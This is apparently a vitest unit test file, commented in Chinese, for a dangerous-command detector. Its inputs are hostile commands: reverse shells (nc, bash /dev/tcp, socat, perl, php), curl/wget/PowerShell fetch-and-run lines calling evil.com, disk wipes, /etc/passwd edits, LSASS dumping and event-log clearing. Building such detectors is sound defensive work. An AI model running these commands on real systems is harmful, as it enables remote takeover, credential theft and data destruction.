/**
 * command-security.test.ts
 * 单元测试：危险命令检测
 *
 * 策略：直接测 checkCommandSafety() 和 checkPathSafety() 的实际返回。
 * 命令格式与源码中正则一一对应（不是另写正则）。
 */

import { describe, it, expect } from "vitest";
import { checkCommandSafety, checkPathSafety } from "../src/command-security.js";

// ── 反向 Shell 检测 ───────────────────────────────────────────

describe("checkCommandSafety — 反向 Shell", () => {
  it("nc -e 反向 shell", () => {
    const r = checkCommandSafety("nc -e /bin/bash 192.168.1.1 4444");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("netcat");
    expect(r[0].severity).toBe("critical");
  });

  it("bash -i >& /dev/tcp 反向 shell", () => {
    const r = checkCommandSafety("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("reverse shell");
  });

  it("socat exec 反向 shell", () => {
    const r = checkCommandSafety("socat exec:'bash -i',tcp:192.168.1.1:4444");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].severity).toBe("critical");
  });

  it("python -c urllib import → 检测", () => {
    const r = checkCommandSafety("python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://evil.com/shell.py').read())\"");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("python");
  });

  it("mkfifo + openssl 混合反向 shell（正则要求字面量 /bin/sh）", () => {
    // 源码模式: /\bmkfifo.*\/bin\/sh.*-i.*openssl.*-connect/i
    // \/bin\/sh 要求字面量 /bin/sh（而 /bin/bash 无法匹配）
    // bash -i 之后需直接跟 openssl（中间无管道符）
    const r = checkCommandSafety("mkfifo /tmp/f; /bin/sh -i openssl s_client -connect 192.168.1.1:4444");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("mkfifo");
    expect(r[0].severity).toBe("critical");
  });

  it("perl -e use Socket bash → 检测", () => {
    const r = checkCommandSafety("perl -e 'use Socket;$i=\"192.168.1.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("perl");
  });

  it("php -r fsockopen bash → 检测（需 bash 出现在 fsockopen 之后）", () => {
    // 源码模式: php -r ... fsockopen ... bash（bash 需在 fsockopen 之后出现）
    const r = checkCommandSafety("php -r 'set_time_limit(0); $s=fsockopen(\"192.168.1.1\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("php");
  });
});

// ── 磁盘破坏检测 ──────────────────────────────────────────────

describe("checkCommandSafety — 磁盘破坏", () => {
  it("rm -rf / 系统路径", () => {
    const r = checkCommandSafety("rm -rf /");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("rm -rf");
  });

  it("dd 写入原始磁盘", () => {
    const r = checkCommandSafety("dd if=/dev/zero of=/dev/sda bs=1M count=100");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].severity).toBe("critical");
  });

  it("mkfs 格式化", () => {
    const r = checkCommandSafety("mkfs.ext4 /dev/sdb1");
    expect(r.length).toBeGreaterThan(0);
  });

  it("写入 /dev/sd 块设备", () => {
    const r = checkCommandSafety("echo 'data' > /dev/sda");
    expect(r.length).toBeGreaterThan(0);
  });

  it("写入 /etc/passwd", () => {
    const r = checkCommandSafety("echo 'hacker:x:0:0::/:/bin/sh' >> /etc/passwd");
    expect(r.length).toBeGreaterThan(0);
  });

  it("sed -i 修改系统认证文件", () => {
    const r = checkCommandSafety("sed -i 's/root:x:/root::/' /etc/passwd");
    expect(r.length).toBeGreaterThan(0);
  });

  it("rm -rf home 目录", () => {
    const r = checkCommandSafety("rm -rf ~/");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("home");
  });

  it("xargs rm 间接删除", () => {
    const r = checkCommandSafety("find /tmp -name '*.log' | xargs rm -rf");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("xargs rm");
  });

  it("find -delete 批量删除", () => {
    const r = checkCommandSafety("find / -delete");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("find -delete");
  });
});

// ── 下载 + 执行检测 ───────────────────────────────────────────

describe("checkCommandSafety — 下载并执行", () => {
  it("curl + && + chmod +x 执行", () => {
    const r = checkCommandSafety("curl http://evil.com/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("chmod");
  });

  it("curl + && + sh 执行", () => {
    const r = checkCommandSafety("curl http://evil.com/script.sh && sh");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("shell execute");
  });

  it("wget + && + bash 执行", () => {
    const r = checkCommandSafety("wget -O- http://evil.com/script.sh && bash");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("bash");
  });

  it("curl 管道到 sh（Line 83 模式）", () => {
    // 源码 Line 83: curl ... | sh/bash/zsh 等
    const r = checkCommandSafety("curl http://evil.com/script.sh | sh");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("curl pipe");
  });

  it("echo + pipe bash", () => {
    const r = checkCommandSafety("echo '#!/bin/bash' | bash");
    expect(r.length).toBeGreaterThan(0);
  });
});

// ── 系统操作危险命令检测 ─────────────────────────────────────

describe("checkCommandSafety — 系统操作", () => {
  it("shutdown", () => {
    const r = checkCommandSafety("shutdown -h now");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("shutdown");
  });

  it("reboot", () => {
    const r = checkCommandSafety("reboot");
    expect(r.length).toBeGreaterThan(0);
  });

  it("init 0", () => {
    const r = checkCommandSafety("init 0");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("init");
  });

  it("init 6", () => {
    const r = checkCommandSafety("init 6");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("init");
  });

  it("systemctl stop sshd（远程锁机）", () => {
    const r = checkCommandSafety("systemctl stop sshd");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("disable SSH");
  });

  it("gdb -p 进程注入", () => {
    const r = checkCommandSafety("gdb -p 1234");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("gdb");
  });

  it("strace -p 进程追踪", () => {
    const r = checkCommandSafety("strace -p 1234");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("strace");
  });

  it("insmod 加载内核模块（文件名格式 rootkit.ko）", () => {
    // 源码模式: insmod\s+[\w.]+\.ko → 文件名不含路径，[\w.] 匹配 word char 或 .
    // 命中的规则名是 'kernel module manipulation'（第一个匹配规则）
    const r = checkCommandSafety("insmod rootkit.ko");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("kernel module");
  });

  it("ptrace", () => {
    const r = checkCommandSafety("ptrace -p 1234");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("ptrace");
  });
});

// ── Windows 凭证窃取检测 ─────────────────────────────────────

describe("checkCommandSafety — Windows 凭证窃取", () => {
  it("procdump LSASS", () => {
    const r = checkCommandSafety("procdump -ma lsass.exe");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("LSASS");
  });

  it("comsvcs.dll MiniDump", () => {
    const r = checkCommandSafety("rundll32.exe comsvcs.dll,MiniDump lsass.exe");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("comsvcs.dll");
  });

  it("reg save HKLM", () => {
    const r = checkCommandSafety("reg save HKLM\\SYSTEM sys.hiv");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("registry hive dump");
  });

  it("JuicyPotato 提权", () => {
    const r = checkCommandSafety("JuicyPotato.exe -a whoami");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("JuicyPotato");
  });

  it("SweetPotato 提权", () => {
    const r = checkCommandSafety("SweetPotato.exe -a whoami");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("SweetPotato");
  });

  it("Sqldumper 进程转储", () => {
    const r = checkCommandSafety("sqldumper.exe ProcessID 0 0x0110");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("Sqldumper");
  });

  it("EventCleaner 反取证", () => {
    const r = checkCommandSafety("EventCleaner.exe suspend");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("EventCleaner");
  });

  it("REG ADD 修改注册表", () => {
    const r = checkCommandSafety("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\mal.exe /f");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("registry modification");
  });

  it("wevtutil 清除安全日志", () => {
    // 源码模式: wevtutil\s+(cl|sl|el|epl|gp)\s/i（不区分大小写）
    // 命中的规则名是 'Windows event log manipulation'
    const r = checkCommandSafety("wevtutil cl Security");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("Windows event log");
  });
});

// ── 编码逃逸检测 ─────────────────────────────────────────────

describe("checkCommandSafety — 编码逃逸", () => {
  it("telnet 命令注入（管道）", () => {
    const r = checkCommandSafety("echo 'test' | telnet 192.168.1.1 4444");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("telnet");
  });

  it("powershell new-object 注入", () => {
    const r = checkCommandSafety("echo 'test' | powershell (new-object Net.WebClient).DownloadString('http://evil.com/s.ps1')");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("PowerShell");
  });

  it("rev 管道反转混淆", () => {
    const r = checkCommandSafety("echo 'test' | rev | bash");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("rev");
  });

  it("SSI 注入", () => {
    const r = checkCommandSafety("<!--#echo var='test' -->");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("SSI");
  });

  it("php escapeshellarg + gzcompress 编码绕过", () => {
    const r = checkCommandSafety("php -r 'system(escapeshellarg(gzcompress($_GET[x])));'");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].name).toContain("escapeshellarg");
  });

  it("crontab 注入", () => {
    const r = checkCommandSafety("echo '* * * * * curl http://evil.com/cron.sh | bash' | crontab -");
    expect(r.length).toBeGreaterThan(0);
  });
});

// ── 安全命令（不应触发）────────────────────────────────────────

describe("checkCommandSafety — 安全命令不触发", () => {
  const safeCommands = [
    "ls -la",
    "pwd",
    "whoami",
    "echo 'hello world'",
    "cat /etc/hostname",
    "ps aux",
    "df -h",
    "free -m",
    "curl https://api.github.com",
    "wget --spider https://example.com",
    "git status",
    "npm install express",
    "node --version",
    "python3 --version",
    "echo $PATH",
    "ls /tmp",
    "mkdir -p /tmp/test",
    "touch /tmp/test.txt",
    "grep 'hello' /tmp/test.txt",
    "tar -czf backup.tar.gz /home/user/data",
    "find /var/log -name '*.log' -mtime +7",
    "awk '{print $1}' data.csv",
    "chmod 644 /tmp/test.txt",
    "cp /tmp/test.txt /tmp/test.bak",
    "mv /tmp/test.txt /tmp/renamed.txt",
    "head -n 10 /var/log/syslog",
    "tail -n 100 /var/log/auth.log",
    "sort -u data.txt",
    "uniq -c data.txt",
    "cat /var/log/nginx/access.log",
    "systemctl status nginx",
    "docker ps",
    "docker images",
    "npm list --depth=0",
    "python3 -m pip install --upgrade pip",
    "curl -H 'Authorization: Bearer $TOKEN' https://api.example.com",
  ];

  safeCommands.forEach((cmd) => {
    it(`安全命令不触发: ${cmd}`, () => {
      const r = checkCommandSafety(cmd);
      expect(r.length).toBe(0);
    });
  });
});

// ── checkPathSafety ──────────────────────────────────────────

describe("checkPathSafety", () => {
  it("检测写入 /etc/passwd", () => {
    const r = checkPathSafety("/etc/passwd");
    expect(r.length).toBeGreaterThan(0);
    expect(r[0].severity).toBe("critical");
  });

  it("检测写入 /etc/shadow", () => {
    const r = checkPathSafety("/etc/shadow");
    expect(r.length).toBeGreaterThan(0);
  });

  it("检测写入 /etc/sudoers", () => {
    const r = checkPathSafety("/etc/sudoers");
    expect(r.length).toBeGreaterThan(0);
  });

  it("检测写入 /boot 目录", () => {
    const r = checkPathSafety("/boot/vmlinuz");
    expect(r.length).toBeGreaterThan(0);
  });

  it("安全路径不触发", () => {
    const safePaths = [
      "/tmp/test.txt",
      "/var/log/app.log",
      "/home/user/documents/report.pdf",
      "/tmp/backup.tar.gz",
    ];
    safePaths.forEach((p) => {
      const r = checkPathSafety(p);
      expect(r.length).toBe(0);
    });
  });
});
